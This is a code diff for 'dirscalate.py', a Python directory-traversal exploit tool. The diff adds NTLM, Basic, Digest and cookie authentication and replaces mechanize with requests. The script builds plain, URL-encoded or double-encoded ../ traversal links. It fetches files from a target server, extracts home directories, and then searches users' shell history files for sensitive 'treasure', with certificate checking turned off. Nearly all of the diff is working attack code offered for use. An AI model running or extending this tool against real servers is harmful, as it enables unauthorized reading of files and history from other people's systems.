@@ -5,9 +5,12 @@
 
 import re
 import argparse
-import mechanize
 import StringIO
 import datetime
+import requests
+from requests.auth import HTTPBasicAuth
+from requests.auth import HTTPDigestAuth
+from requests_ntlm import HttpNtlmAuth
 
 parser = argparse.ArgumentParser(prog='dirscalate.py', 
 	formatter_class=argparse.ArgumentDefaultsHelpFormatter,
@@ -33,11 +36,36 @@ parser.add_argument('--type',
 	default=1,
 	type=int,
 	help='1 (../), 2 (URL encoded), or 3 (double encoded)')
+parser.add_argument('--ntlmuser', 
+	default=None,
+	help='use NTLM authentication with this username (format of domain \\ username)')
+parser.add_argument('--ntlmpass', 
+	default=None,
+	help='use NTLM authentication with this password')
+parser.add_argument('--basicuser', 
+	default=None,
+	help='use BASIC authentication with this username')
+parser.add_argument('--basicpass', 
+	default=None,
+	help='use BASIC authentication with this password')
+parser.add_argument('--digestuser', 
+	default=None,
+	help='use DIGEST authentication with this username')
+parser.add_argument('--digestpass', 
+	default=None,
+	help='use DIGEST authentication with this password')
+parser.add_argument('--cookie', 
+	default=None,
+	help='use a previously established sessions cookie')
+
 parser.set_defaults(histfile='histfile.txt', tokens='tokens.txt', logfile='dirscalate.txt', depth=10, type=1)
 
 # Stick arguments in a variable
 args = vars(parser.parse_args())
 separator = ''
+req = ''
+session = requests.Session()
+cookies = {}
 
 # BUild the depth of the traversal for the link
 def buildTraversal(depth, type):
@@ -80,15 +108,52 @@ newLink = createLink(args['link'], traversal)
 history = open(args['histfile'])
 
 print '[*] Attempting exploit on: '+newLink
-browse = mechanize.Browser()
 
-try:
-  browse.open(newLink)
-except:
+# Check to see if BASIC/DIGEST/NTLM/Cookie authentication is being performed
+# If so, pass credentials to session, if not, just connect to JNLP URL
+if args['ntlmuser'] is not None and args['ntlmpass'] is not None:
+  session.auth = HttpNtlmAuth(args['ntlmuser'],args['ntlmpass'], session)
+  req = session.get(newLink, verify=False)
+elif args['basicuser'] is not None and args['basicpass'] is not None:
+  session.auth = HTTPBasicAuth(args['basicuser'],args['basicpass'])
+  req = session.get(newLink, verify=False)
+elif args['digestuser'] is not None and args['digestpass'] is not None:
+  session.auth = HTTPDigestAuth(args['digestuser'],args['digestpass'])
+  req = session.get(newLink, verify=False)
+elif args['cookie'] is not None:
+
+  # Check to see if the cookie has a semicolon, if so there might be mutiple cookies
+  if re.search(';', args['cookie']):
+    cookielist = args['cookie'].split(';')
+
+    # Loop through list of cookies
+    for dircookies in cookielist:
+
+      # If there isn't an equal and some sort of content, then it isn't a valid cookie, otherwise add to list of cookies
+      if re.search('[a-zA-Z0-9]', dircookies) and re.search('[=]', dircookies):
+        cookieparts = dircookies.split('=')
+        cookies[cookieparts[0]] = cookieparts[1]
+
+  else:
+
+    # Check to see if cookie has =, if not it is malformed and send dummy cookie
+    # If so, split at the = into correct name/value pairs
+    if re.search('=', args['cookie']):
+      cookielist = args['cookie'].split('=')
+      cookies[cookielist[0]] = cookielist[1]
+    else:
+      cookies['dirscalate'] = 'dirscalate'
+
+  req = session.get(newLink, cookies=cookies, verify=False)
+else:
+  req = session.get(newLink, verify=False)
+
+# If the status code is not 200, the file was likely inaccessible so we exit
+if req.status_code is not 200:
   print '[*] Link was inaccessible, exiting.'
   exit(0)
 
-page = browse.response().read()
+page = req.text
 lines = page.split('\n')
 homedirs = []
 
@@ -126,10 +191,15 @@ for hist in history.readlines():
     print '[+] Searching: '+home+separator+hist.strip()
 
     try:
-      # Access the traversal link with mechanize
-      histbrowse = mechanize.Browser()
-      histbrowse.open(newLink)
-      page = histbrowse.response().read()
+      # Access the traversal link
+      req = ''
+
+      if args['cookie'] is not None:
+        req = session.get(newLink, cookies=cookies, verify=False)
+      else:
+        req = session.get(newLink, verify=False)
+
+      page = req.text
       lines = page.split('\n')
       treasure = []
 
